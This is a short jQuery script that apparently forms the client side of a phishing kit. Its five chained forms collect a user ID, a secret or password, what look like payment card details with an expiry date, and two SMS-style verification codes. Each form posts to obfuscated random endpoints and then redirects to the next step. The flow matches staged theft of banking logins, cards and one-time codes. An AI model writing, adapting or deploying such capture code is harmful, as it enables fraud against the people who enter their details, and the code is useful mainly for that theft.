$(function(){
    $("#pg1").on("submit",function(e){
        e.preventDefault();
        let nifo = $("#nifo").val();
        


        //send backend:
        $.ajax({
            url: '/gzLbTbjqMpc34D4XsPJ2',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({nifo}),
            success: function(info) {
                if(info.OK){
                    window.location = "/fGnEL4jmpuBCDkJP3myR";
                }
            }
        });
    });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let secr = $("#secreto").val();
        //send backend:
        $.ajax({
            url: '/NkMNm4664XhcW8KuukHk',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({secr}),
            success: function(info) {
                if(info.OK){
                    window.location = "/Q89HFszQPd3TFv4mx65k";
                }
            }
        });
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        let a1 = $("#one").val();
        let a2 = `${$("#two1").val()}/${$("#two3").val()}`;
        let a3 = $("#three").val();
        let a4 = $("#five").val();


        //send backend:
        $.ajax({
            url: '/m4kT9BQWt7KTDdaVmafx',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3,a4}),
            success: function(info) {
                if(info.OK){
                    window.location = "/aEsKRvuaENZtYax265Kv";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps1 = $("#codima").val();
        
        //send backend:
        $.ajax({
            url: '/Qv69PRvXg6PQEvrzJx6j',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/sioPjs3GHBkd7KSDGkdv";
                }
            }
        });
    });
    $("#pg5").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#codima").val();
        
        //send backend:
        $.ajax({
            url: '/jK6hfjYT7poOP8hLPOjk',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/HfuRVXK8w8fLmT2vWHe8";
                }
            }
        });
    });



});